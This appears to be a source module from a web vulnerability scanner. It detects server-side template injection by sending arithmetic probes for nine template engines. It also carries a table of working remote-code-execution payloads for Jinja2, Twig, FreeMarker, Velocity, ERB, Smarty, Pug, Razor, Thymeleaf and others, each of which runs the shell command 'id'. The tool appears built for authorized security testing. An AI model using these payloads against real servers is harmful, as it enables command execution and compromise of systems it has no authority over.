from __future__ import annotations
from huntnyx.core.common import *  # noqa: F401,F403


_SSTI_ENGINES = [("jinja/twig", "{{%d*%d}}"), ("freemarker", "${%d*%d}"),
                 ("velocity", "#set($x=%d*%d)$x"), ("erb", "<%%= %d*%d %%>"),
                 ("smarty", "{%d*%d}"),
                 ("pug/jade", "= %d*%d"), ("pug-interp", "#{%d*%d}"),
                 ("razor", "@(%d*%d)"), ("thymeleaf", "[[${%d*%d}]]")]


class SSTIModule(_Module):
    name = vuln = "ssti"

    def probe(self, http, ip):
        if not ip.dynamic:
            return []
        sigs = []
        baseline = _send_with(http, ip, "canary" + _rand()).text
        engine = fmt = None
        for eng, tmpl in self._order(ip):
            a, b = random.randint(1000, 9999), random.randint(1000, 9999)
            payload, product = tmpl % (a, b), str(a * b)
            body = _send_with(http, ip, payload).text
            if product in body and payload not in body and product not in baseline:
                engine, fmt = eng, tmpl
                sigs.append(Signal(self.vuln, f"arithmetic-eval[{eng}]", "ssti.arith_a",
                                   SignalStrength.PROOF, f"{payload} -> {product}",
                                   {"payload": payload, "product": product}))
                break
        if not engine:
            return sigs
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        payload, product = fmt % (a, b), str(a * b)
        body = _send_with(http, ip, payload).text
        if product in body and payload not in body and product not in baseline:
            sigs.append(Signal(self.vuln, f"arithmetic-eval-2[{engine}]", "ssti.arith_b",
                               SignalStrength.PROOF, f"{payload} -> {product}",
                               {"payload": payload, "product": product}))
        return sigs

    @staticmethod
    def _order(ip):
        hint = " ".join(ip.tech).lower()
        keyed = {"twig": 0, "jinja": 0, "flask": 0, "django": 0, "symfony": 0,
                 "freemarker": 1, "velocity": 2, "ruby": 3, "erb": 3, "rails": 3,
                 "smarty": 4, "php": 4,
                 "pug": 5, "jade": 5, "node": 5, "express": 5,
                 "razor": 7, "asp.net": 7, "iis": 7, ".net": 7, "kestrel": 7,
                 "thymeleaf": 8, "spring": 8, "java": 8}
        pref = next((i for k, i in keyed.items() if k in hint), None)
        if pref is None:
            return _SSTI_ENGINES
        return [_SSTI_ENGINES[pref]] + [e for j, e in enumerate(_SSTI_ENGINES) if j != pref]


def phase_ssti(target, config, runner):
    return _vuln_phase(target, config, runner, "ssti")


_SSTI_EXPLOIT = {
    "jinja/twig": ("{{7*7}}  (expect 49)", [
        ("Jinja2/Python", "{{cycler.__init__.__globals__.os.popen('id').read()}}"),
        ("Twig/PHP",      "{{['id']|filter('system')}}"),
        ("Nunjucks/Node", "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"),
    ]),
    "freemarker": ("${7*7}  (expect 49)", [
        ("FreeMarker/Java", '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'),
        ("Mako/Python",     "${__import__('os').popen('id').read()}"),
    ]),
    "velocity": ("#set($x=7*7)$x  (expect 49)", [
        ("Velocity/Java", '#set($e=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$e'),
    ]),
    "erb": ("<%= 7*7 %>  (expect 49)", [
        ("ERB/Ruby", "<%= `id` %>"),
        ("EJS/Node",  "<%= global.process.mainModule.require('child_process').execSync('id') %>"),
    ]),
    "smarty": ("{7*7}  (expect 49)", [
        ("Smarty/PHP", "{system('id')}"),
    ]),
    "pug/jade": ("= 7*7  (expect 49)", [
        ("Pug/Node", "= global.process.mainModule.require('child_process').execSync('id')"),
    ]),
    "pug-interp": ("#{7*7}  (expect 49)", [
        ("Pug/Node", "#{global.process.mainModule.require('child_process').execSync('id')}"),
    ]),
    "razor": ("@(7*7)  (expect 49)", [
        ("Razor/.NET", '@{ System.Diagnostics.Process.Start("cmd","/c id"); }'),
    ]),
    "thymeleaf": ("[[${7*7}]]  (expect 49)", [
        ("Thymeleaf/Spring", "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]"),
    ]),
}


def _ssti_exploit_lines(techniques):
    """Given a finding's signal techniques (e.g. 'arithmetic-eval[pug/jade]'),
    return engine + PoC + candidate RCE hint lines for the confirmed engine."""
    eng = None
    for t in techniques:
        m = re.search(r"\[([^\]]+)\]", t or "")
        if m and m.group(1) in _SSTI_EXPLOIT:
            eng = m.group(1)
            break
    if not eng:
        return []
    poc, rces = _SSTI_EXPLOIT[eng]
    out = [f"engine : {eng}", f"PoC    : {poc}",
           "RCE (pick per stack; authorized testing only):"]
    for label, payload in rces:
        out.append(f"   - {label}: {payload}")
    return out


def _r_ssti(d):
    return _r_injection("SSTI (template injection)", d, exploit=_ssti_exploit_lines)


INJECTION_MODULES.append(SSTIModule)
